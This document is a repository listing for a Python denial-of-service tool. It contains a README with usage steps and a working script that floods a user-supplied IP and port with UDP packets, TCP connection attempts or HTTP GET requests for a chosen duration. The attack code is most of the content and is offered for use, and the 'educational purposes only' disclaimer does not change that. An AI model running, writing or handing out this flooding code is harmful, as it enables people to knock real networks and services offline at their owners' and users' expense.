# DEGREATARIZONA DDOS TOOL

### Repository Structure:
```
DA-DDOS/
│
├── README.md
├── LICENSE
├── .gitignore
├── requirements.txt
└── ddos.py
```

## `README.md`

# DDoS Tool

This tool is written for educational purposes only. It demonstrates how different types of DDoS (Distributed Denial of Service) attacks can be conducted. Use it responsibly and only in a controlled environment where you have permission to perform such tests.

## Features

- UDP Flood Attack
- SYN Flood Attack
- HTTP Flood Attack

## Usage

### Prerequisites

- Python 3.x
- Required Python packages listed in `requirements.txt`

### Installation

Clone the repository:

```sh
git clone https://github.com/yourusername/DDoS-Tool.git
cd DDoS-Tool
```

Install the required packages:

```sh
pip install -r requirements.txt
```

### Running the Tool

Run the script:

```sh
python ddos_tool.py
```

Follow the prompts to input target IP, port, attack duration, and packet data size.

### Example

```sh
Input Target IP Address: 192.168.1.1
Input Target Port: 80
Input Your Attack Duration In Seconds: 60
Input Packet Data Size In Bytes: 1024
Choose Flood Attack > 
 1. UDP Flood 
 2. SYN Flood 
 3. HTTP Flood 
Input Attack Choice: 1
```

## Legal Disclaimer

This tool is for educational purposes only. The author is not responsible for any misuse of this tool. You should only use it to test your own network or have explicit permission from the owner of the network.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Author

- [DegreatArizona](https://degreatarizona.com)
```

### `LICENSE`
```markdown
MIT License

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
```

### `.gitignore`
```
__pycache__/
*.pyc
*.pyo
*.pyd
.env
```

### `requirements.txt`
```
termcolor
```

### `ddos_tool.py`
(This is your main script file. Copy your debugged script content here.)

```python
import sys
import random
import os
import time
import socket
from termcolor import colored

os.system("clear")
os.system("figlet DegreatArizona DDOS")

print()
print(colored("Author   : DegreatArizona", 'green'))
print(colored("Website  : https://degreatarizona.com", 'blue'))
print(colored("Github   : https://github.com/DegreatArizona", 'blue'))
print(colored("YouTube  : https://www.youtube.com/@DegreatArizona", 'blue'))
print(colored("LinkedIn : https://www.linkedin.com/in/degreatarizona", 'blue'))
print(colored("Twitter  : https://twitter.com/degreatarizona", 'blue'))
print(colored("This tool is written for educational purposes only :)", 'yellow'))
print(colored("Degreatarizona is not responsible for misusing it.", 'yellow'))
print()

ip = input(colored("Input Target IP Address: ", 'green'))
try:
    port = int(input(colored("Input Target Port: ", 'green')))
except ValueError:
    print(colored("Error :( Port Does Not Exist.  Quitting...", 'blue'))
    sys.exit()

try:
    dur = int(input(colored("Input Your Attack Duration In Seconds: ", 'green')))
except ValueError:
    print(colored("Error :( Invalid Input.  Quitting...", 'blue'))
    sys.exit()

try:
    packet_size = int(input(colored("Input Packet Data Size In Bytes: ", 'green')))
    if packet_size <= 0:
        raise ValueError
except ValueError:
    print(colored("Invalid Packet Data Size :( Exiting...", 'blue'))
    sys.exit()

def udp_flood(ip, port, dur, packet_size):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (ip, port)
    start_time = time.time()
    packet_count = 0
    while True:
        try:
            message = random._urandom(packet_size)
            s.sendto(message, target)
            packet_count += 1
            print(colored(f"Sent Packet {packet_count} Of Size {packet_size} bytes", 'red'))
        except socket.error:
            break
        if time.time() - start_time >= dur:
            break
    s.close()

def syn_flood(ip, port, dur):
    sent = 0
    timeout = time.time() + dur
    while True:
        if time.time() > timeout:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((ip, port))
            sent += 1
            print(colored(f"SYN Packets Sent: {sent} To Target: {ip}", 'red'))
        except (socket.error, OSError):
            pass
        except KeyboardInterrupt:
            print(colored("\n[*] SYN ATTACK STOPPED", 'green'))
            sys.exit()
        finally:
            sock.close()

def http_flood(ip, port, dur):
    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
    sent = 0
    timeout = time.time() + dur
    while True:
        if time.time() > timeout:
            break
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.01)
            sock.connect((ip, port))
            sock.sendall(http_request)
            sent += 1
            print(colored(f"HTTP Packet Sent: {sent} to Target: {ip}", 'red'))
        except (socket.error, OSError):
            pass
        except KeyboardInterrupt:
            print(colored("\n[-] ATTACK STOPPED BY USER", 'green'))
            break
        finally:
            sock.close()

print()
attack_type = input(colored("Choose Flood Attack > \n 1. UDP Flood \n 2. SYN Flood \n 3. HTTP Flood \n Input Attack Choice: ", 'green'))

if attack_type == "1":
    print(colored("UDP Flood Attack selected", 'red'))
    udp_flood(ip, port, dur, packet_size)
    print(colored("UDP Flood Attack Completed :-)", 'green'))
elif attack_type == "2":
    print(colored("SYN Flood Attack Selected", 'red'))
    syn_flood(ip, port, dur)
    print(colored("SYN Flood Attack Completed :-)", 'green'))
elif attack_type == "3":
    print(colored("HTTP Flood Attack Selected", 'red'))
    http_flood(ip, port, dur)
    print(colored("HTTP Flood Attack Completed :-)", 'green'))
else:
    print(colored("Error :( Invalid Attack Type Exiting", 'red'))
    sys.exit()
```
